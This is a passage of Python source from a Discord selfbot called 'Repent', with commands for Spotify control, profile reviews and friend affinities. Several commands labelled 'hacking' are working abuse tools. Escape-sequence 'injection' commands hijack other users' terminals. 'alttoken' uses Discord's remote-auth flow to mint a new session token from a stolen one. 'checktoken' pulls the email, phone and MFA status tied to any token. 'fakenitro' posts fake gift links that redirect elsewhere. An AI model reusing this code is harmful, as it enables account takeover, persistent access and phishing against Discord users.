@Repent.command(description=f"Changes someones console title bar text. \nUsage: {config_get('prefix')}injecttitle [@user] [title text]", help="hacking")
async def injecttitle(ctx, user: typing.Optional[discord.User] = None, *, title=None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    if title == None:
        title = "Repent"
    code = f'{user_mention} \033]0;{title}\007'
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Cuts someones console in half. \nUsage: {config_get('prefix')}injectcut [@user]", help="hacking")
async def injectcut(ctx, user: discord.User = None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[S' * 20 + '\033[T' * 20  
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Takes over someones console by clearing it changing their title and displaying ascii art. \nUsage: {config_get('prefix')}injecttakeover [@user]", help="hacking")
async def injecttakeover(ctx, user: discord.User = None):
    headers = {'Authorization': config_get('token')}
    nitro = (await arequesters.get("https://discord.com/api/v9/users/@me", headers=headers))
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f"""{user_mention} [91mR[93mA[92mI[96n[94mB[95mO[97mW[0m
]0;HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON
c"""
    if nitro.json()["premium_type"] == 2:
        ascii1 = f"""{user_mention} 
[93m [93m [93m [91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m
[93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m
[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[93m
[93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m
[93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m

[43;31;1;4m#RepentOnTop[0m"""
    else:
        ascii1 = f"{user_mention} [43;31;1;4m#RepentOnTop[0m"
    await ctx.send(f'{code}', delete_after=0)
    await ctx.send(f'{ascii1}', delete_after=0)

@Repent.command(description=f"Generates a new token for the given token. \nUsage: {config_get('prefix')}alttoken <token>", help="hacking")
async def alttoken(ctx, account_token):
    keypair = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
    async def serialize_key(key):
        t = key.public_key().public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return base64.b64encode(t).decode('latin1')

    async def rsa_decrypt(key, decoded_nonce):
        return key.decrypt(
            decoded_nonce,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    def decode_nonce(e):
        return base64.b64decode(e.encode('latin1'))

    def encode_decrypted_packet(e):
        return base64.b64encode(bytes(e)).decode('latin1').replace('/', '_').replace('+', '-').rstrip('=')

    async def get_handshake_token(token, fingerprint):
        response = (await arequesters.post(
            'https://discord.com/api/v9/users/@me/remote-auth',
            json_data={'fingerprint': fingerprint},
            headers={'Authorization': token}
        ))
        return response.json()['handshake_token']

    async def finish_handshake(token, handshake_token):
        return (await arequesters.post(
            'https://discord.com/api/v9/users/@me/remote-auth/finish',
            json_data={'handshake_token': handshake_token, 'temporary_token': False},
            headers={'Authorization': token}
        ))

    async def get_encrypted_token_from_ticket(ticket_var):
        response = (await arequesters.post(
            'https://discord.com/api/v9/users/@me/remote-auth/login',
            json_data={'ticket': ticket_var}
        ))
        return response.json()['encrypted_token']

    async def handle_message(data, ws):
        j = json.loads(data)
        
        if j["op"] == "hello":
            serialized = await serialize_key(keypair)
            keypacket = {
                "op": "init",
                "encoded_public_key": serialized,
            }
            await ws.send(json.dumps(keypacket))
        
        if j["op"] == "nonce_proof":
            decoded = decode_nonce(j["encrypted_nonce"])
            decrypted = await rsa_decrypt(keypair, decoded)
            final_nonce = encode_decrypted_packet(decrypted)
            nonce_packet = {
                "op": "nonce_proof",
                "nonce": final_nonce,
            }
            await ws.send(json.dumps(nonce_packet))
        
        if j["op"] == "pending_remote_init":
            fingerprint = j["fingerprint"]
            handshake_token = await get_handshake_token(account_token, fingerprint)
            await finish_handshake(account_token, handshake_token)
        
        if j["op"] == "pending_login":
            ticket = j["ticket"]
            encrypted_token = await get_encrypted_token_from_ticket(ticket)
            decoded = decode_nonce(encrypted_token)
            decrypted = await rsa_decrypt(keypair, decoded)
            new_token = decrypted.decode('utf-8')
            heading = "Alt-Token"
            body = new_token
            cmdname = "alttoken"
            await panelmaker(ctx, heading, body, cmdname)
            await ws.close()

    async def main():
        try:
            async with websockets.connect('wss://remote-auth-gateway.discord.gg/?v=2', extra_headers={'Origin': 'https://discord.com'}) as ws:
                while True:
                    data = await ws.recv()
                    await handle_message(data, ws)
        except websockets.exceptions.ConnectionClosed as e:
            pass
        except Exception as e:
            pass
    await main()

@Repent.command(description=f"Changes the main token to another specified token within Tokens.json config. \nUsage: {config_get('prefix')}changetoken <token number (e.g 1 2 3)>", help="utility")
async def changetoken(ctx, token_number: int):
    token_key = f"Token{token_number}"

    with open('data//Settings//Configs//tokens.json', 'r') as file:
        tokens = json.load(file)

    with open(CONFIG_FILE, 'r') as file:
        config = json.load(file)
        current_token = config.get('token', None)

    if token_key not in tokens:
        await ctx.send(f"Token key '{token_key}' not found.")
        return

    new_token, tokens[token_key] = tokens[token_key], current_token

    with open('data//Settings//Configs//tokens.json', 'w') as file:
        json.dump(tokens, file, indent=4)

    config['token'] = new_token
    with open(CONFIG_FILE, 'w') as file:
        json.dump(config, file, indent=4)
    try:
        heading = f"Token Swapped!"
        body = f"Token '{token_key}' has been swapped and Repent is now attempting to restart."
        cmdname = "changetoken"
        await panelmaker(ctx, heading, body, cmdname)
        os.startfile("Repent.exe")
    except FileNotFoundError:
        os.system("python Repent.py")
        os._exit(1)
    except Exception as e:
        await ctx.send(f"Failed to restart Repent.exe: {e}")

@Repent.command(description=f"Sends half a user's Discord token. \nUsage: {config_get('prefix')}halftoken [@user]", help="hacking")
async def halftoken(ctx, member: discord.User = None):    
    if member == None:
        member = ctx.message.author
    encoded = base64.b64encode('{}'.format(member.id).encode('ascii'))
    heading = f"Half of {member.name}'s Discord Token"
    body = encoded.decode()
    cmdname = "halftoken"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Generates and sends a random nitro code. \nUsage: {config_get('prefix')}fakenitro [redirect link]", help="hacking")
async def fakenitro(ctx, link = "https://discord.gg/repent"):    
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    await ctx.send(f"[discord.gift/{code}]({link})")

@Repent.command(description=f"Grabs info about a specified token. \nUsage: {config_get('prefix')}checktoken <token>", help="hacking") 
async def checktoken(ctx, token):    
    try:
        headers = {
        'Authorization': token,
        'Content-type': 'application/json'}
        r = (await arequesters.get("https://discord.com/api/v9/users/@me" , headers=headers))
        global r1
        if r.status_code == 401:
            heading = "Token Check"
            body = f"Token is invalid."
            cmdname = "Check Token"
            await panelmaker(ctx, heading, body, cmdname)
            return
        elif r.status_code == 200:
            data = r.json()
            id = data["id"]
            username = data["username"]
            email = data["email"]
            phone = data["phone"]
            mfa = data['mfa_enabled']
            language = data['locale']
            flags = data['public_flags']
            r1 = (await arequesters.get("https://discord.com/api/v9/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true", headers = headers))
            if r1.status_code == 403:
                locked = True
            elif r1.status_code != 403:
                locked = False
        heading = "Token Check"
        body = f"ID: {id}\nUsername: {username}\nEmail: {email}\nPhone Number: {phone}\nMFA: {mfa}\nLanguage: {language}\nFlags: {flags}\nLocked: {locked}"
        cmdname = "Check Token"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "Token Check"
        body = "Token Invalid"
        cmdname = "checktoken"
        await panelmaker(ctx, heading, body, cmdname)
        
@Repent.command(description=f"Deletes any webhook. \nUsage: {config_get('prefix')}delwebhook <webhook url>", help="hacking")
async def delwebhook(ctx, url):    
    try:
        (await arequesters.delete(url))
        heading = "Delete Webhook"
        body = "Webhook successfully deleted!"
        cmdname = "delwebhook"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}")
        heading = "Delete Webhook"
        body = f"Something went wrong, please check console Error: {str(e)}"
        cmdname = "delwebhook"
        await panelmaker(ctx, heading, body, cmdname)
        await send_webhook("Delete Webhook Error", f"Failed to delete the webhook due to: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))

@Repent.command(description=f"Gives info on an IP. \nUsage: {config_get('prefix')}ipinfo <IP>", help="hacking")
async def ipinfo(ctx, ip):    
    r = (await arequesters.get(f'https://ipinfo.io/{ip}/json'))
    r = r.json()
    city = r['city']
    region = r['region']
    org = r['org']
    postal = r['postal']
    timezone = r['timezone']
    heading = f"Info on IP {ip}"
    body = f"City: {city}\nRegion: {region}\nOrg: {org}\nPostal Code: {postal}\nTime Zone: {timezone}"
    cmdname = "ipinfo"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Plays a song in spotify. \nUsage: {config_get('prefix')}play <song>", help="spotify")
async def play(ctx, *, song):
    await spotify_access()
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    headers = {"Authorization": spotifytoken, 'content-type': 'application/json'}
    songurl = (urlify(f"https://api.spotify.com/v1/search?q={song}&type=track&limit=1"))    
    a = json.loads((await arequesters.get(songurl, headers=headers)).text)
    link = a['tracks']['items'][0]['uri']
    payload={"uris":[link],"position_ms":0}
    payloadlen = len(str(payload))
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/play?device_id={spot_device}", headers={'authorization': spotifytoken, 'content-type': 'application/json', 'content-length': str(payloadlen)}, json_data=payload))

@Repent.command(description=f"Pauses your spotify. \nUsage: {config_get('prefix')}pause", help="spotify")
async def pause(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/pause?device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Resumes your spotify. \nUsage: {config_get('prefix')}resume", help="spotify")
async def resume(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/play?device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Skips to the next song in spotify. \nUsage: {config_get('prefix')}skip", help="spotify")
async def skip(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.post(f"https://api.spotify.com/v1/me/player/next?device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Plays the previous song in spotify. \nUsage: {config_get('prefix')}previous", help="spotify")
async def previous(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.post(f"https://api.spotify.com/v1/me/player/previous?device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Shuffles a playlist in spotify. \nUsage: {config_get('prefix')}shuffle", help="spotify")
async def shuffle(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/shuffle?state=true&device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Unshuffles a playlist in spotify. \nUsage: {config_get('prefix')}unshuffle", help="spotify")
async def unshuffle(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/shuffle?state=false&device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Adjusts the volume in spotify. \nUsage: {config_get('prefix')}volume <volume (1-100)>", help="spotify")
async def volume(ctx, volume):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/volume?volume_percent={volume}&device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Loops the current song in spotify. \nUsage: {config_get('prefix')}loop", help="spotify")
async def loop(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/repeat?state=context&device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Repeats the current song in spotify once. \nUsage: {config_get('prefix')}looponce", help="spotify")
async def looponce(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/repeat?state=track&device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Stops looping the current song in spotify. \nUsage: {config_get('prefix')}stoploop", help="spotify")
async def stoploop(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads((await arequesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken})).text)['device']['id']
    (await arequesters.put(f"https://api.spotify.com/v1/me/player/repeat?state=off&device_id={spot_device}", headers={'authorization': spotifytoken}))

@Repent.command(description=f"Sends a listen along link so the people can listen along with your spotify. \nUsage: {config_get('prefix')}listenalong", help="spotify")
async def listenalong(ctx):
    myload = {"content":"","nonce":"","tts":False,"activity":{"type":3,"session_id":seshid,"party_id":f"spotify:{Repent.user.id}"}}
    headpls = {'authorization': config_get('token'), 'Content-Type': 'application/json'}
    r = requested.post(f'https://ptb.discord.com/api/v9/channels/{ctx.channel.id}/messages', headers=headpls, data=json.dumps(myload))

@Repent.command(description = f"Displays what song is currently playing on your spotify. \nUsage: {config_get('prefix')}nowplaying", help = "spotify")
async def nowplaying(ctx):
    spotifytoken  = await spotify_access()
    r = json.loads((await arequesters.get(f'https://api.spotify.com/v1/me/player', headers={'authorization': spotifytoken})).text)
    artistnames = []
    artistlist = r['item']['artists']
    for thing in artistlist:
        artistnames.append(thing['name'])
    artists = ', '.join(artistnames)
    heading = f"Now Playing: {r['item']['name']}"
    body = f"ID: {r['item']['id']}\nDuration: {str(timedelta(seconds = int(str(int(r['item']['duration_ms']) / 1000).split('.')[0]))).strip('00:')}\nAlbum: {r['item']['album']['name']}\nAlbum Type: {r['item']['album']['type']}\nArtist/s: {artists}\nAlbum Released: {r['item']['album']['release_date']}\nSong Popularity: {r['item']['popularity']}\nTrack Number: {r['item']['track_number']}\nMarket Count: {len(r['item']['available_markets'])}"
    cmdname = "nowplaying"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Shows a users reviews on Review DB. \nUsage: {config_get('prefix')}reviews [@user]", help="utility")
async def reviews(ctx, user: discord.User=None):
    body = ""
    if not user:
        user = Repent.user
    revreq = (await arequesters.get(f'https://manti.vendicated.dev/api/reviewdb/users/{user.id}/reviews?flags=0&offset=0')).json()
    username = (await arequesters.get(f'https://canary.discord.com/api/v9/users/{user.id}/profile', headers={'authorization':config_get('token')})).json()['user']['global_name']
    heading = f"User Reviews for {username} ({revreq['reviewCount']} total)"
    for review in revreq['reviews']:
        if review['id'] != 0:
            body += f"Review from {review['sender']['username']}\n{review['comment']}\n\n"
    cmdname = "reviews"
    if revreq['reviewCount'] == 0:
        heading = "Reviews"
        body = f'{user.name} is lonely he got no reviews damn'
        cmdname = "reviews"
        await panelmaker(ctx, heading, body, cmdname)
        return
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Writes a review on a users profile. \nUsage: {config_get('prefix')}review <@user> <review>", help="utility")
async def review(ctx, user: discord.User, *, review):
    try:
        payload = {
            "authorize": True,
            "integration_type": 0,
            "permissions": "0"
        }
        resp = (await arequesters.post(f"https://discord.com/api/v9/oauth2/authorize?client_id=915703782174752809&response_type=code&redirect_uri=https%3A%2F%2Fmanti.vendicated.dev%2Fapi%2Freviewdb%2Fauth&scope=identify", headers={"Authorization": config_get('token')}, json_data=payload)).json()
        link = resp['location']
        resp = (await arequesters.get(link+"&clientMod=vencord")).json()
        dbtoken = resp['token']
        uid = str(user.id)
        payload = {
            "comment": review,
            "userid": uid
        }
        (await arequesters.put(f"https://manti.vendicated.dev/api/reviewdb/users/{uid}/reviews", json_data=payload, headers={"Authorization": dbtoken}))
        heading = "Review Successful!"
        body = f"Successfully reviewed {user.name}"
        cmdname = "review"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "Error"
        body = "An unknown erorr occured."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Deletes a review you have on a user. \nUsage: {config_get('prefix')}delreview <@user>", help="utility")
async def delreview(ctx, user: discord.User):
        payload = {
            "authorize": True,
            "integration_type": 0,
            "permissions": "0"
        }
        resp = (await arequesters.post(f"https://discord.com/api/v9/oauth2/authorize?client_id=915703782174752809&response_type=code&redirect_uri=https%3A%2F%2Fmanti.vendicated.dev%2Fapi%2Freviewdb%2Fauth&scope=identify", headers={"Authorization": config_get('token')}, json_data=payload)).json()
        link = resp['location']
        resp = (await arequesters.get(link+"&clientMod=vencord")).json()
        dbtoken = resp['token']
        revreq = (await arequesters.get(f'https://manti.vendicated.dev/api/reviewdb/users/{user.id}/reviews?flags=0&offset=0')).json()
        for review in revreq['reviews']:
            if review['id'] != 0:
                if review['sender']['discordID'] == str(Repent.user.id):
                        payload = {"reviewid": review['id']}
                        resp = (await arequesters.delete(f"https://manti.vendicated.dev/api/reviewdb/users/{review['id']}/reviews", headers={'Authorization': dbtoken}, json_data=payload)).json()
                        if resp["success"] == True:
                            heading = "Review Deleted!"
                            body = f"Successfully deleted review from {user.name}"
                            cmdname="delreview"
                            await panelmaker(ctx, heading, body, cmdname)
                            return
                        else:
                            heading="Error"
                            body="An issue occured whilst trying to delete review."
                            cmdname = "ERROR"
                            await panelmaker(ctx, heading, body, cmdname)
                            return
        heading = "Could Not Find Review"
        body = f"Could not find a review from you on user '{user.name}'"
        cmdname = "delreview"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Shows who discord believes your favourite friends to be based on their affinity algorithm. \nUsage: {config_get('prefix')}favouritefriends", help="fun")
async def favouritefriends(ctx):
    r = json.loads((await arequesters.get('https://discord.com/api/v9/users/@me/affinities/users', headers={'authorization': config_get('token'), 'x-super-properties': getxsuper()})).text)['user_affinities']
    if r == []:
        heading = "Error"
        body = "You have no user affinities."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    top10 = []
    for i in range(0,10):
        req = (await arequesters.get(f"https://discord.com/api/v9/users/{r[i]['user_id']}/profile", headers={'authorization': config_get('token'), 'x-super-properties': getxsuper()})).json()
        name = req['user']['global_name']
        top10.append(name)
    heading = f"{Repent.user.name}'s Favourite Friends"
    body = '\n'.join(top10)
    cmdname = "favouritefriends"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Shows what guilds discord believes to be your favourite based on their affinity algorithm. \nUsage: {config_get('prefix')}favouriteguilds", help="fun")
async def favouriteguilds(ctx):
    r = json.loads((await arequesters.get('https://discord.com/api/v9/users/@me/affinities/guilds', headers={'authorization': config_get('token')})).text)
    if r['guild_affinities'] == []:
        heading = "Error"
        body = "You have no guild affinities."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return   
    userguilds = json.loads((await arequesters.get('https://discord.com/api/v9/users/@me/guilds', headers={'authorization': config_get('token')})).text)
    myguilds = {}
    for guild in userguilds:
        myguilds[str(guild['id'])] = guild['name']
    top10 = []
    for i in range(0,10):
        guild = r['guild_affinities'][i]['guild_id']
        top10.append(f"{i+1}. {myguilds[guild]}")
    heading = f"{Repent.user.name}'s Favourite Guilds"
    body = '\n'.join(top10)
    cmdname = "favouriteguilds"
    await panelmaker(ctx, heading, body, cmdname)
